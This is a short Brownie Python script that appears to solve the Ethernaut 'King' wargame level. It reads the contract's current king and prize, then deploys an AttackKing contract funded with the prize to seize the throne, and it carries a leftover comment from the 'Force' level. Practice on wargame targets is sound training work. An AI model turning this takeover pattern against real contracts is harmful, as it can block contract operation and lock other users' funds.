from brownie import accounts,config,AttackKing, web3, King, network
import time
def main():
    network.priority_fee('5 gwei')
    contract = '0x1d93eE9539394d7A8D6933f192e9e281089c257F'
    player = accounts.add(config['wallets']['from_key'])

    contract_instance = King.at(contract)

    king = contract_instance._king()

    print(f'King is: ', king)
    
    prize = contract_instance.prize()
    print('Prize amount: ', prize)
    attack_contract = AttackKing.deploy(contract_instance,{'from':player,'amount': prize})
    
    king = contract_instance._king()
    print(f'King is: ', king)

    # Simple transfer or send won't work because the Force implements 
    # neither receive nor fallaback functions. Calls with any value will revert.
    # player.transfer(Force.at(contract)) (Wrong)

    